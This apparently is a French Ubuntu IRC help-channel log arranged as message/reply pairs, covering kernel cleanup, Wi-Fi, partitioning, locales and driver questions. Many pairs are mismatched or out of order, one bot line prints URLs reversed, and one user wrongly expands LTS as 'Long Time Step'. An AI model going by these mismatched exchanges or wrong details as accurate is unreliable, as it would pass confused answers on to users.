(en gros)	je confonds avec remove --purge qui est équivalent à purge
j'vous fais confiance pour ça ;)	tente autoremove d'abord, et si ça ne fonctionne pas, tu chercheras plus loin ^^
purge, ça supprime les paquets demandés, et leurs configurations	je confonds
sudo apt-get purge linux-image-3.16.0-{23,28,29,30,31}-generic	euh... non
comme ça, ménage dans /boot et dans / par la même occasion :)	les dernières versions d'apt-get ne considère pas purge comme un alias à autoremove ?
juste 15	fait-nous un petit "uname -r" aussi :)
15	le problème vient tout simplement du nombre important de kernels installés
j'essaye cette comamnde "dpkg -l | grep -c linux-image"	tu peux la relancer sans le "-c" et me paster le résultat ?
désolé j'etais au telephone	ok, maintenant montre nous la liste sur un paste: dpkg -l | grep linux-image
Les espaces ont été créer automatiquement lors de l'instalaltion j'ai aps vraiment choisi	tu peux essayer un sudo apt-get autoremove --purge dans un premier temps oui
j'ai lancé une commande du genre "apt-get autoremove"   je suis pas sur de la commande exacte (j'ai suivi ce qui était ecris)	, que te renvoie: dpkg -l | grep -c linux-image
(ça se récupère, mais c'est pas évident)	que te renvoie: dpkg -l | grep -c linux-image
que te renvoie: dpkg -l | grep -c linux-image	il me renvoie que j'ai pas de soucis
le message me parle d'espace manquant sur /boot	tu peux (faut pas te planter) supprimer le noyau en cours, puis installer le plus récent.
=> http://paste.ubuntu-fr-secours.org/src-145776	clairement, 236Mo t'en mets pas beaucoup des kernels
merci white_bear	t'as viré les anciens kernels ?
!paste	un jour, ils te voleront ton métier </private>
lol	df -h
@Jakel tente l'option --ytdl-format=bestvideo+bestaudio	bien vu ! mais je ne veux pas passe par mpv et youtube-dl
oui, avec ma petite configuration qui ne fait meme pas HD	C'est ta carte graphique ou ton ordi qui est limité?
-x -y ou quelque chose comme ca	Tu veux visionner des YouTube en meilleure qualité.  C'est ça?
j en profite pour une autre question pendant que t es dispo	J'écoute
c est note. prochaine reinstallation j y retourne	:)
mais jetais sure d avoir la final 15	14.04 c'est la dernière version stable.   La 15 c'est une bonne action pour le développement d'Ubuntu.  Déconseillée pour les utilisateurs non expérimentés.
c est pas en version final ??? >:o	Tu saisis?
je suis passe a linux apres la fin des mises a jour xp	15, c'est pour expérimenter le futur
debutant	14.04 est très stable
oui, je suis un bleubite ^ ^	15 est un beta pour les cracks
j aurais a faire ca a chaque reinstallation donc ...	Alors, lors de la prochaine installation, utilises 14.04 LTS et refuse de passer à 15
il fallait que je passe en utc universel	Bleubite???  Qu'ossé?
15.04	1 min
1 min	c est bon, on m a aidé a cote
c est bon, on m a aidé a cote	Tu réinstalle souvent????
j ai beau choisir le bon fuseau horraire, mon lubuntu n affiche pas la bonne heure	:)
je crois comprendre	prends le temps de regarder déjà les logiciels qui sont disponibles avec les dépôts officiels
il y a 10 fichiers	tu peux les lister sur un pastebin ?
la version cache n'apparait pas	pourquoi Linux Mint ?
E: _cache->open() failed, please report."	On dirait que tu as essayé d'installer un fichier de dépot non conventionnel, tu peux faire un cat /etc/apt/sources.list.d/mono-xamarin.list ?
ok je vais le faire	 si j etais toi j aisserais les dernieres versions, en live de Unity / gnome, en 14.10 / 15.04. Voir elelementary Freya. Si deja a l install le wifi n 'est pas reconnu tu passes a autre chose.
et je certain que ça va fonctionner	essaye toujours ?
ce serait un bon test, mais j'ai peu de doutes voir même aucun sur le hardware,	erf, dommage :/
(question sans doute idiote vu que t'as déjà creusé un peu, mais juste au cas où…)	n'étant pas mon pc, je vais avoir du mal à savoir quand le problème est apparu exactement, c'est pour aider un ami, ce serait pourtant l'info la plus intéressante
c'est la question qui est la plus posée	:)
:)	ton message m'a fait une notification
Bonjour a tous, j'aurais besoin d'aide: J'ai installer ubuntu depuis mon PC Portable sur un disque dur externe. L'installation c'est bien déroulée, et après le reboot, le système a toujours très bien fonctioné. Malheureusement, ma copine a débrancher mon disque dur externe alors qu'Ubuntu était encore en route. Depuis cet incident, je n'ai plus de rétro éclairage sur le Pc Portable. PS:La touche sur le clavier pour acti	il manque la fin de ta phra
command line interface	convert src.png dest.pdf
j'utilise quoi pour transformer rapidos une image en pdf ? =)	 open office ?
 open office ?	je pensais a un truc en cli
Vous connaissez un logiciel pour télécharger des sous titres avec des sources correctes (genre Addic7ed), en cli ou graphique peu importe	subdownloader
merci beaver c'est intéressant	tu as un probleme de module tu peux aussi utiliser l'ancienne version, Madwifi
!wiki AR542x	Error: I tried to send you an empty message.
<house> Dès l'allumage du pc, donc impossible de discerner les infos de démarrage, bios etc.	c'était juste une précision, pour tester avec un écran externe :)
sans succès :(	tu es en mode graphique, ou en console ?
!wiki atheros	http://doc.ubuntu-fr.org/wifi_atheros_ar9285 | http://doc.ubuntu-fr.org/wifi_atheros | http://doc.ubuntu-fr.org/atheros_ar5007eg | http://doc.ubuntu-fr.org/atheros_ar5212 | http://doc.ubuntu-fr.org/atheros_ar5001
je lis le lien	ça peut être un probleme driver ou un probleme logiciel
re beaver	c'est peut être network-manager le probleme, t'as essayé avec wicd ?
beaver	un lsmod | grep ath5k ça donne quoi ?
(pour examen ultérieur !)	dans le log ici plus haut on doit y voir des choses intéressantes , peut voulez vous parler du ifconfig ?
beaver http://paste.ubuntu-fr-secours.org/src-145359 j'ai abrégé aux posts d'aujourd'hui	un ifconfig te donne quoi ?
j'ai fait un sudo service network-manager restart mais après ça la carte est en hardblock et plus moyen de la réactiver même avec rfkill unblock all !	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
absolu/relatif/etc.	c'est ce que je regarde, mais en prod/staging ça marche
tu arrive pas a voir? je suis sur windows 8.1la	tu peux démarrer sur un livecd ?
sur mes portables je pourrais mais mon vieux pc de bureau ne supporte pas au delà de 12.04.2 (12.04..5 ne passe pas à cause de ma CG)	j'ai connu ça, c'est embetant, à l'époque c'était avec une GMA
quand ça n'est pas cassé, faut pas réparer ;-)	faudra l'oublier un jour ^^ faut s'adapter je trouve 'fin du moins quand le matériel le permet, ne serait ce qu'avec le systemd tu vas prendre une claque quand tu vas l'avoir entre les mains, cobra7476-pc ah mince, j'avais bien une commande pour voir si tu étais sur une session efi ou non mais la :/
je ne peux pas t'aider sur le problème uefi / legacy	t'es sous Ubuntu la ?
lol	après reboot marche toujours po
tu cassera rien c'ets que des locale	je n'ai pas lu ce que tu a écrit après  "avant reboot lol"
nano	j'était plus la
avant reboot lol	j'avais pas tenté le reboot
très fan de cette distro simple efficace et tous ce qu'a arch	j'ai eu un peu de mal à l'istalation rapport à mon wifi caché mais rien de bien méchant
j'ai eu un peu de mal à l'istalation rapport à mon wifi caché mais rien de bien méchant	 change tes locale
 change tes locale	j'ai bien tenter mais il faut croire que toute la doc que j'ai trouvezr est passé de date
sa rigole pas ici lol	oui, je m'était intéressé à arch il ya as quelques année et ça passait pour être plutot compliqué,
bonne fin de soirée	bonne soirée à toi aussi
et encore c'est parce que les softs et les pilotes sont pas dev pour linux	tu tourne sous quel distro
tu tourne sous quel distro	ubu-gnome sur mon desktop et arch sur netbook
l'ennuie c'est que je ne sais pas lequel en particulier, j'avais fini par perdre patience à l'époque est supprimer mon $HOME complet	le home je m'en fou ya aucun fichier dessus
bah ouep les mise a jour de version s'ets un peu la loterie	jamais compris ou ça merdait mais ça venait de mes fichier de config
je peux acceder au partoche depuis mon archlinux	j'ai souvent eu se genre de pb avec kubuntu
login pass en console pass epas alors que les même soous plasma marche	alors essaie de booter sur liveusb, de faire un backup de ton dossier utilisateur et de le supprimer
je voie juste le curseur souris	tu peux créer un autre compte utilisateur depuis la console?
tu peux créer un autre compte utilisateur depuis la console?	j'ai verifier les locale et c'ets pas un soucis de clavier
cg 980 gtx nvidia	?
?	bah c'est la qu'est le hic sous console impossible de se loguer
mais sous console il reconnait pas mon login alors que celui ci passe sous plasma	l'écran noir c'est avant ou après que tu ai rentré ton login dans kdm
J'ai un petit problème, depuis mon passage à la 15.04 mes tty ne sont plus configuré en utf-8, par contre, tous les pts fonctionne normalement. quelqu'un sait ou je peux régler ça?	quand tu tapes "locale charmap" ça te donne quoi ?
ls -l /var/lib/vdr/channels.conf ?	-rw-r--r-- 1 root root 9199 avril 28 09:16 /var/lib/vdr/channels.conf
/var/log	tu connais VDR ?
14.04LTS. Freeze sur le logging screen et en recovery. Impossible de bouger même la souris. Et impossible de passer en ligne de commande. Je n'ai pas la main sur le clavier. J'ai une install de 14.04LTS sur une clé USB et je craque...	je comprends pas: tu démarres sur une clé là ? c'est une live usb ?
(sauf que le fait que j'utilise freebsd fait tout tomber à l'eau)	un plugin qui ne fonctionne que avec cette version
un plugin qui ne fonctionne que avec cette version	je suis pas sûr que ça soit le plus simple pour toi
je suis pas sûr que ça soit le plus simple pour toi	oui c'est pas simple mais je suis obligé à le faire pour que le plugin fonctionne! en fait je le fait sur mon ancien PC, mais j'ai oublié comment j'ai fait lol :P
oui c'est pas simple mais je suis obligé à le faire pour que le plugin fonctionne! en fait je le fait sur mon ancien PC, mais j'ai oublié comment j'ai fait lol :P	et le plugin fait quoi ? c'est pas remplaçable par autre chose ?
-Je n'arrive toujours pas à trouver de solutions à mon problème...	qui est ?
les autres viennent avec le paquet, et y'a plus de chances que tu ne les aient pas touchées	es-tu un linuxien dans l'âme?
es-tu un linuxien dans l'âme?	c'est un peu bizarre, mais j'ai envie de répondre oui
avez vous une idée comment faire pour l'installer!	quelle bonne raison pour utiliser une ancienne version ?
normalement non	on fait j'ai crée un lien symbolique vers kde4-config, et puis au lieu de supprimer le lien j'ai supprimé le kde4-config lol :D
je sais pas si son re-installation va causer la perte d'une config ou autre..	par ailleurs, quel hasard de manipulation a pu te laisser supprimer ce fichier ?
bonjour, j'ai supprimé /usr/bin/kde4-config par erreur, est ce que c'est dangereux pour le systeme? si oui comment le recuperer svp	réinstaller le paquet ?
Le problème apparait pour beaucoup de monde apparemment.	Je dois y aller, bonne chance..
Ok	Je viens de vérifier , Impossible.
bonjour, nouveau sur linux , je cherche à faire du mirroring de mon écran d'ordinateur sur ma TV en DLNA . Est ce possible ?	tu as essayé : paramètres système / affichage / Même image sur tous les écrans ?..
j ai attendu pas mal de temps qu il creve, et il a gagné, j ai abandonné avant le disque	et tu en as vu combien cramer ? mon experience c'est que smart est correct 9 fois sur 10
et tu en as vu combien cramer ? mon experience c'est que smart est correct 9 fois sur 10	je pense avoir eu pas mal de chance
ok	je me souviens d un disque qui etait a plus de 3 fois sa durée de vie et qui marchait tres bien
Si dans "Disques", on a comme estimation "LE DISQUE VA PROBABLEMENT BIENTOT DEFAILLIR", cela signifie que le DD est irrécupérable?	ca veut dire qu'il faut tout sauvegarder avant de se poser d'autre question
ca veut dire qu'il faut tout sauvegarder avant de se poser d'autre question	Toutes les données ont déjà été sauvées mais l'ordi est récupérable ou pas?
Toutes les données ont déjà été sauvées mais l'ordi est récupérable ou pas?	l'ordi oui, en changeant le disque, le disque il y a 90 0e risque qu'il soit mort, pour en etre sur il faut regarder du coté de l'ultimate boot disk, jouer avec les outils constructeurs, suivant la marque de ton disque et contacter le constructeur
slt, comment on fait pour avoir un équivalent de "Appliquer cette permission aux fichiers contenus dans le dossier" dans une règle udev ?	je pense qu'il pourrait y avoir un XY problem: http://xyproblem.info/ … quelle est ta vraie question?
je pense qu'il pourrait y avoir un XY problem: http://xyproblem.info/ … quelle est ta vraie question?	lorsque je branche mon galaxy s3 j'ai accès aux dossier et aux fichiers (même si ça met du temps à les afficher) mais par exemple si je veux afficher une image je dois la copier sur mon dd pour qu'il s'affiche ou lorsque je veux copier un ensemble de dossiers je ne peux pas je dois copier un ensemble de fichiers ordinaires sinon il crash
tu n'as pas des dizaines de répertoires contenant des configurations dans ton homedir	 oui le problème se situe là
sinon, c'est qu'il faut chercher ailleurs ^^	Marmotte
si ça change de comportement, c'est qu'il faut chercher dans ce dossier (très probable)	ok je reviens
(et éventuellement les remettre par morceaux ensuite, jusqu'à trouver ce qui cloche)	 le problème c'est de trouver les fichier de configuration qu'il faut toucher
 le problème c'est de trouver les fichier de configuration qu'il faut toucher	renomme le répertoire ~/.config déjà, et relance ta session
qu'avais tu comme ppa lors de ton upgrade ? as tu installé des paquets tiers aux dépots de ta Ubuntu stable	oui j'ai des paquets tiers
je suis sous unity	ce probleme est propre à ta session ?
ce probleme est propre à ta session ?	oui c'est propre à ma session, j'ai testé d'autres session et tout marche normalement
tu valodes et tu reboot NekoSan ou tu relances ta session et ça devrait être ok	perso, j'installe juste numlockx
une autre personne pour m'aider?	tu connais l'adresse de ton LAN ? (ex: 192.168.1.0)
quand je fais un ifconfig je n'ai pas d'ip assigné	mais ta box est configuré comment ?
je saurai pas faire de copier coller par contre vu que je n'ai pas le net et que je suis sur une autre machine pour vous parler :) donc je vais devoir recopier "à la main" xD	la configuration ip n'est pas disponible mmh.. t'es en dhcp ?
Konsole est ouvert	pouvons nous avoir les dernieres lignes du kern.log pendant ta manoeuvre ? sudo tailf /var/log/kern.log
J'ai un soucis avec Kubuntu : J'ai installé kubuntu 15.04 après installation il n'arrive pas à connecter la carte réseau.Il tourne un moment en statut "Connexion" puis apres un instant il m'indique : la configuration ip n'est pas disponible	vois tu ce qu'est un terminal ?
/home/bourquard/Images/Capture du 2015-04-27 17:47:24.png	non
sudo apt-get install scrot; scrot te fait tout ça en une seule commande	justement, je sais pas si il sait se servir d'un termina, je connais le "client" on va dire
!wiki screenshot	http://doc.ubuntu-fr.org/capture_d_ecran | http://doc.ubuntu-fr.org/screenshot | http://doc.ubuntu-fr.org/ksnapshot | http://doc.ubuntu-fr.org/capture | http://doc.ubuntu-fr.org/shutter
C'est a dire escargotdu25 ?	en fait dans la version 12.04 j'avais une icone "programmes" et la je ne l'ai plus
Donc la 15.04 n'est pas LTS, je vais donc devoir la mettre à jour dans pas très longtemps c'est ça?	 les mises à jours sont automatiquement faites , mais sur une LTS elles durent période plus longue (5 ans au lieu de 2 je crois mais c'est à vérifier)
Okay merci pour l'info!	oui, utiliser une version normale implique de faire des mise à jour de distribution plus souvent
mot	et si tu pouvais arrêter de mettre plein de 'l' à "lol", voire éviter d'écrice "lol+" aussi souvent...
Okay: que signifie le LTS qu'il y avait pour la 14.04 ?	LTS = Long Time Support, Support technique à long terme *
C'est bien la 15.04 la nouvelle version? Est elle stable ou pas encore?	LTS = Long Time Step, Support technique à long terme
Damn.. Je fais du 55ko/s... Fichier iso dans 3h! ^^	 c'est une version sortie officiellement donc elle tourne bien logiquement comme les autres versions d'ubutnu
Mais je n'arrive pas à copier ma partion actuelle pour la coller plus tot dans le disque dure	tu n'as pas fait grand chose, en fait, avec ta sda5
J'ai un message m'indiquant que sda5 (la partition ntfs) ne peut pas etre supprimée	 pourquoi ? y'a pas de détail ?
Peut on augmenter la taille d'une partition si l'espace libre est situé avant celle ci?	gparted le fait :)
Pourquoi ma partition sda7 (linux) est monté, qu'est ce que ça signifie?	monté signofie disponible dans l'arborescence du système de fichiers :)
Pas compris Max! ^^	essaie de désactiver la swap
Okay je savais pas ^^	donne moi ton IP t'en qu'à être la lolllç
Il me marque: Impossible de supprimer /dev/sda5 !Veuillez démonter toute partition logique avec un numéro plus haut que 5	sda5 est une partition étendue, pas une partition ntfs
Pourquoi dans gParted, les opérations se mettent en attente?	parce que tu commences par lister tout ce que tu veux faire, et tu valides ensuite
Non j'ai aucune données importantes sur Windows. Et je formate également Recovery?	si tu es certain de ne jamais en avoir besoin, tu dois pouvoir formater
J'ai plusieurs partitions en ntfs je les formate si je veux supprimer Windows?	vérifie avant ce qu'il y a dessus
les 2 autres, c'est supposer être ton swap et ta partition étendu	ça dépend de chacun, ça
Ma partition Linux est celle en ext4?	en fait ta racine et ton home sont supposer être en ext4 (si ta Ubuntu)
Bonjour à tous! Je compte supprimer Windows 7 de mon, je suis actuellement en dual boot avec Lubuntu. Me conseillez vous d'utiliser OS-Unistaller ou  ou de le faire manuellement avec gparted?	quel est ton boot loader ?
peut être un truc à l'initialisation des interfaces qui le réactive automatiquement...	ça m'étonnerait pas que ça soit network-manager qui overwrite la chose *:
bizarre que ça n'ait rien fait, ces lignes...	bein si je sysctl -p ça fonctionne, mais me suffit de reboot pour qu'il le ne le prenne pas en compte
et pour être joignable par internet en ipv6, il faudrait qu'Orange ait intégré le support ipv6 dans les livebox, ce qui n'est pas encore le cas xD	certes xD
tu avais mis quoi dans ton fichier sysctl ?	oui, mais ton dhcp te genere une adresse ipv6, tu es joignable par cette adresse depuis le Ninternet
au reboot, l'ipv6 est toujours présent.	pourquoi tu veux désactiver ipv6, au fait ?
je sais j'ai suivit celle de ubuntu	https://wiki.debian.org/fr/KernelFAQ (et change vite de canal !)
C'est juste car j'ai un pc très recent auxuquel la carte graphique ne fonctionne que sous linux 3.19 ou plus et que Debian à un noyau 3.16	tu peux déjà essayer de passer sur #debianfr (ou #debian-fr sur oftc), et sinon, un noyau, ça se compile bien
Bonjour, j'ai une question puis-je installer un kernel ubuntu sur une debian (un kernel qui provient de http://kernel.ubuntu.com/~kernel-ppa/mainline/) ?	c'est offtopic, et sans doute pas une bonne idée
?	il est bien activé
(dans ccsm)	dans ccsm je ne trouve pas d'actions qui correspondent à ce que je cherche
dans "commandes / assignation des touches" : je ne trouve pas les entrées pour ce type de raccourci :-/	active "Bureau / Ubuntu Unity plugin" si ça l'est pas..
unity : 7.3.2+15.04.20150420-0ubuntu1	dans les paramètres du clavier, tu as vérifié que tout est toujours OK niveau raccourcis clavier ?
dans les paramètres du clavier, tu as vérifié que tout est toujours OK niveau raccourcis clavier ?	oui j'ai bien CTRL + ALT + T pour lancer un terminal
bah pourtant ça avait l'air de marcher c'est quoi le problème il n'arrive pas à ouvrir le fichier ?	j'ouvre le logiciel, je sélectionne l'option pour restaurer l'image sauvegardée. Je parcours ensuite jusqu'à l'emplacement exact, mais il ne voit pas l'imae
Ça marche comment en faite ?	barf c'est un gâchis de temps, tu me donnes tout ça mais ça ne marche pas. Pourtant le truc est sensé fonctinoner sous linux. Peut être qu'il faut être ingénieur informaticien pour le faire fonciionner sous linuxlol
Je reste a dispodition didem	eh bien, hélas, il semble qu'en fouillant avec le logiciel, il ne trouve pas le fichier de sauvegardes. Pourtant je suis bien au bon endroit. C'est terrible.
un bug	aha il faut avouer !
aha il faut avouer !	zut le logiciel affiche un grand nombre d'erreur au démarrage. On dirai que c'est parce que je suis pas en mode root. Comment on le lance graphiquement en moderoot ?
c'est bon tu vas y arriver ?	 m'a bien aidé, il a installé le "RPM" et là je peux installer le logicile enfin. Merci beaucoup à lui !
 m'a bien aidé, il a installé le "RPM" et là je peux installer le logicile enfin. Merci beaucoup à lui !	c'est bon ça s'installe ?
c'est bon ça s'installe ?	oui c'est bon
oui c'est bon	ah et c'est fini ? ça marche ?
ah et c'est fini ? ça marche ?	non pas encore mon PC est lent tu as vu
non pas encore mon PC est lent tu as vu	ah au faite c'est toi qui a un clavier qwerty ou c'est juste un bug ?
c'est plus compliqué que ça en l'air, le bash demande une installation RPM ou un truc du genre	aha oui j'ai vu !
120 méga octot teamviewer quand même	t'as lancé du coup ?
t'as lancé du coup ?	ça y est l'installation est terminée. Je lance teamviewever maintenant
jesuis désolé mais mon pc étant effroyablement lent je suis très lent. Et en plus là mon mot de passe ne marche plus arg	tu coinces ?..
tu coinces ?..	je conçois là c'est bon j''ai "retoruve" mon mot passe pour installer teamviewer
nesthib tu trolles ou bien ?	non, pourquoi ?
ok j'installe teamviewer	tu me suis ?
dans 3 minutes deadrats j'aurai télécharger le fichier de 478 MO	tape "cd .."
le 64 bits ?	selon deadrats  oui
tu peux me donner le lien de téléchargement ou installer teamviewer STP ?	deadrats l'a donné tout à l'heure : http://download.acronis.com/AcronisBackupL_11.5_trial_fr-FR.i686
donne le renvoi on sera fixé	Mode(s) opératoire(s) des processeurs :32-bit, 64-bit
tu as quelle arch ? 64 ?	ok j'ai annulé mon dl et j'ai prit celui que tu viens de me proposer. deadrats je ne sais pas en fait... j'ai un petit pc faible qui ralentit et mouline ça doit être 32 bit non ? J'ai Xubuntu 64 bitpourtant
Snyperskywalker me propose d'utiiser teamviewer pour aller plus vite	moi je reprendrai la page http://www.acronis.com/fr-fr/enterprise/download/backup/linux-server/
moi je reprendrai la page http://www.acronis.com/fr-fr/enterprise/download/backup/linux-server/	je suis en train de télécharger la version 64 bit j'avais la 32 bit la différence entre nous deux était peut être là ?
et colle ce que ca dit ici	http://pastebin.com/5vQJjnXQ
dans la page que tu m'as donné, il n'y a pas de .tar a tlc..	zut. je vais téélcharger ce fichier alors, ddésolé
Tu as encore le fichier de départ ?	oui, il est en .tar
l*	comment puis je l'exécuter ? je ne vois rien avec clic droit
ok je vais le faire. c'est possible de programmer une sauvegarde régulière de son disque dur vers google drive ?	je pense qu'il fallait pas expliser le fichier AcronisBackupL64_11.5_trial_fr-FR.x86_64 : c'est un shell, il suffisait de k'executer
!wiki clonezilla	mvk/gro.rf-utnubu.cod//:ptth | edragevuas/gro.rf-utnubu.cod//:ptth | eerugifnoc_noitallatsni_noititeper/gro.rf-utnubu.cod//:ptth | allizenolc/gro.rf-utnubu.cod//:ptth
(pas d'opinion sur wine + pc clone)..	non rien
non rien	tu as 23 minutes ? je tlc..
tu as 23 minutes ? je tlc..	oh oui j'ai tout mon temps. merci !
je recherche de la documentation là	j'ai été négligeant de faire une copie de mon pc avec ce logiciel Acronis True IMage.
pas gagné tout ça.	c'est d'un chiant. je vais essayer PC Clone avec wine. Si vous me le déconseiller, et bien ma foi j'utiliserai acronis sous windosws chez le pc d'un ami
Donne voir l'url ?	pardon j'ai été long : http://www.acronis.com/fr-fr/enterprise/download/backup/linux-server/
mon but c'est d'installer ce logiciel, je pensais que ça se ferai avec un exectuable mais c'est raremement simple sur linux	Ils ne disent rien sur le site ou tu l'as téléchargé ?
Ils ne disent rien sur le site ou tu l'as téléchargé ?	et bien j'ai lu rapidement je n'ai pas trouvé. écoutez, si vou spenser que c'est trop compliqué je peux essayé d'installer PC cloner il parait que ça peut ouvrir ces fichiers .tib (avec wine je pourrai l'installer facilmeent)
et tu fais entrer	hum ok c'est fit j'ai quatre lignes trois se terminent par data et une par directeory, logique
est-ce que tu pourrais me copier coller la ligne	didem@didem-HP-Mini-210-3000:~/Téléchargements/AcronisBackupAdvancedLinux_11.5N_
et tu fais entrer	 ok j'ai fait enter
tu as enregistré où ton fichier ?	/home/didem/Téléchargements/AcronisBackupAdvancedLinux_11.5N_trial_en-US/
didem ?	je suis ce que tu me dis
il faut ouvrir un terminal (mais laisse t(omber)	ah bon
et donne le résultat	je suis nul
AcronisBackupAdvancedAgentL_11.5N_43719_en-US	tape "file *" dans le répertoire ou tu as extrait ?..
tape "file *" dans le répertoire ou tu as extrait ?..	je ne sais pas comment aller dans le répertoire, et faire ce file *
pour savoir si je peux le télécharger chez moi et y voir plus clair	penses qu'utiliser wine + un logiciel qui gère les .tib serai une bonne idée ?
Le fichier que t'as téléchargé est lourd ?	oui 480 mega octet, dans une archier. trar que j'ai extraite et dedans il y a trois fichiers qui se fnissent par .i686, et un répertoire nommé Linux qui ne continent aucun finchier
le fichier téléchargé possède quelle extension ?	je veux juste pouvoir ouvrir la sauvegarde en .tib. Mais je ne sais pas comment le faire c'est frustrant
attend, je reboot !	voila une copie d'ecran: https://doc.ubuntu-fr.org/grub-pc
ctrl alt f1, ok, j'ai un ecran noir ou il me demande le login. C'est quoi?	depuis le menu grub, choisi le mode récuperation ou recovery (je sais plus comment il s'appelle)
putain ca va trop vite les gars !	1/ tu rebootes et tu choisis "recovery mode"
c'est tout qu'est-ce que je dis =)	oui t'as raison, je te laisse continuer :)
le mode rescue?	à choisir dans le menu de boot
j'suis ok mais alors commment annuler l'ancien sachant qu'il me le demande	tu peux te connecter via la console et changer ton mot de passe
I'd installed unbutu this morning	⇒ #ubuntu
(Sinon, des idées pour le ramappage des touches? J'ai bien trouvé de la doc mais il propose que de fait des raccourcis, or si je fait un raccourci cela me remappe les deux touches)	xmodmap
xmodmap	merci, solved sur #debian-fr :)
j'ai des reticences par rapport aux logiciels de navigations qui fonctionnent sur lubuntu	C'est à dire? Les navigateurs?
ce n'est pas mon utilisation principale, mais oui, je joue	Quels type de jeux, des exemples?
est ce toujours le cas ?	Quels sont tes besoins?
ok j'ai compris ;)	chris357
c'est vachement plus pratique avec une télécommande	https://help.ubuntu.com/community/Mount/USB#Configuring_Automounting
sous Xubuntu 14.04	la piste c'est de rajouter une entrée dans /etc/fstab
excuses moi, je suis nouveau sur ce type de chat	Dit moi tu es sous 32 ou 64 bits ?
?	ne touche à rien, juste fais ta mise à jour
il actualise...	ok c'est mieux
ok c'est mieux	dans l'onglet "Autres logiciels" j'ai plein de trucs ... comment puis je faire du tri sans "tout casser"
comment résoudre ce "problème" ?	depuis source de logiciels -> onglet Logiciels Ubuntu -> menu Télécharger depuis -> mettre autre chose
depuis source de logiciels -> onglet Logiciels Ubuntu -> menu Télécharger depuis -> mettre autre chose	peux tu être plus précis je suis un débutant+++
peux tu être plus précis je suis un débutant+++	bah va dans les sources de logiciels d'abords
je viens vers vous pour un problème/conseil... j'ai fait une maj vers la 15.04 et lorsque je lance le gesitonnaire de mise à jour j'ai le message :  le téléchargement des informations du dépôts à échoué (vérifier votre connexion internet)	change le serveur par défaut
Question de touriste, comment j enregistre un pseudo sur irc aujourdhui? me faut une application? (j suis loggé sur firefox).	/ns register password email
donc un truc qu'on installe à la place d'ubuntu mais qui considère que pour les données c'est un cloud qui prend le relais ?	"15.04 is the first release that includes snappy Ubuntu Core, a new Ubuntu rendition that uses a new, transactional packaging system: snappy."
bonjour à tous, c'est quoi ubuntu snappy ? je n'ai pas compris	apparemment c'est un système minimal qui fonctionne en ligne
je vais regarder l'url merci	surtout la partie ré-init PulseAudio ;)
aussi	http://doc.ubuntu-fr.org/son_problemes <= également tous ces conseils ?
sous 14.10 tout fonctionnait parfaitement	tu as jeté un oeil dans la gestion des périphérique de son ?
tu as jeté un oeil dans la gestion des périphérique de son ?	oui tout est reconnu mais aucun son
oui tout est reconnu mais aucun son	tu as essayé avec alsamixer ?
tu peux les contacter via le formulaire de contact du site	ok merci
merci	ça à fonctionné?
ça à fonctionné?	en fait c'était assez simple en haut
vous savez qui sont les admin sys de doc.ubuntu-fr.org ?	l'association Ubuntu-fr
je voudrais mettre le clavier de mon ubuntu en francais	dans un terminal 'setxkbmap fr'
salut	http://doc.ubuntu-fr.org/tutoriel/configurer_le_clavier c'est pas un truc comme ça ?
ah	là c'est bon, c'est passé
pas de problème de vitesse ici	et j'ai un timeout avec une erreur nginx
y'a pas de raison	sur unity, ils ont fait des trucs
Tu dois avoir un truc de travers, mais j'hésite à te faire tout réinitialiser..	 je me demandais en réinstallant seahorse et en virant manuellement les clés peut être
!wiki swap	http://doc.ubuntu-fr.org/swap | http://doc.ubuntu-fr.org/reactiver_le_swap | http://doc.ubuntu-fr.org/uuid_et_label | http://doc.ubuntu-fr.org/ssd_solid_state_drive | http://doc.ubuntu-fr.org/conky_scripts_systeme
arfôs:)	c'est valable pour tous les sites
aucun nouveau logiciel	tu vois ton site, dans "seahorse" (mot de passe/default) ?
Je sais que je risque de passer pour un demeuré, mais ça ne me parait pas évident de prime abord	tu risques t'en avoir besoin à un moment ou un autre.. win8 = uefi + secure boot
par contre comme je disais, ma femme a peur d'ubuntu... c'est la distrib qu'elle n'a jamais réussi à s'approprier et qui nous a fait migrer vers mac	le 1er lien
!wiki uefi	http://doc.ubuntu-fr.org/uefi | http://doc.ubuntu-fr.org/desactiver_secure_boot | http://doc.ubuntu-fr.org/multiboot_ubuntu12_windows8 | http://doc.ubuntu-fr.org/cohabitation_ubuntu_windows | http://doc.ubuntu-fr.org/ubuntu_64bits
Tu as de l'espace disk ?Tu peux aussi le conserver, ça coûte rien..	je sais pas... que ça peut être utile de garder un autre système au début le temps de vérifier que tout va bien par exemple
Je suis passé de Ubuntu 14.10 à 15.04 et il me manque les boutons, (réduction, maximisation et fermeture) en haut des fenêtres. j'utilise gnome classic	un snapshot ?
je peux toujours tester...	 sur le site de nvidia, tu vas dans driver, type produit "legacy" et la tu trouveras ta carte
!wiki nvidia	http://doc.ubuntu-fr.org/nvidia | http://doc.ubuntu-fr.org/prime | http://doc.ubuntu-fr.org/problemes_nvidia | http://doc.ubuntu-fr.org/nvidia_optimus | http://doc.ubuntu-fr.org/cuda
tmpfs on /run type tmpfs (rw,noexec,nosuid,size=10%,mode=0755)	http://doc.ubuntu-fr.org/gestionnaire_de_pilotes_proprietaires
np	que donne "mount|grep ^tmp" ?..
bonsoir, j'ai un soucis technique pour l'installation d'un driver NVIDIA. Si quelqu'un est dispo, fiate moi signe, merci	pose ta question :)
mais "essayer" en gros, ça tourne...	quand tu as cette somme, paste la ici
mais c'est celui-làque j'ai utilisé	la somme md5 est bonne ?
c'est pour un ami et hélas on n'a qu'un windows sous la main	si c'est le cas, peux tu essayer avec Lili usb plutôt
Comme je l'ai dit, celui de la doc :linuxliveusb	tu utilises Windows ?
une heure x')	tu fais des recherches depuis des heures, et tu peux pas répondre à deux questions ^^
J'ai fait des recherches, quasiment tous les sujets sont sans réponse :/	quel logiciel as tu utilisé pour faire ton live usb ?
oui :x	tu as besoin de quoi dans ubuntu-tweak ?
j'ai suivis le tuto de la doc	tu utilises quoi O/S principal ?
y a pas quelqu un qu a un boulot d admin linux par hazard ?  :)	#pole-emploi :þ
ouais c'est encore autre chose markand :), je suis avec xf86-video-nouveau moi :p	ça marche ? car honnêtement, les rares fois où j'ai testé c'était totalement inutilisable
:/	je passe de 60 fps à 1000 le tout nativement (maintenant) ^^
et bien Nouveau l'active par défaut depuis fin 2014	bingo
'tain deux cm plus à gauche et c'était un laptop au café que j'avais, merci pour ces renseignements Zic	du café à cette heure-ci (ici:19H00 UTC+2) ?..
(en statique)	tu devais avoir "xchat" et pas "xchat-gnome" sous Debian
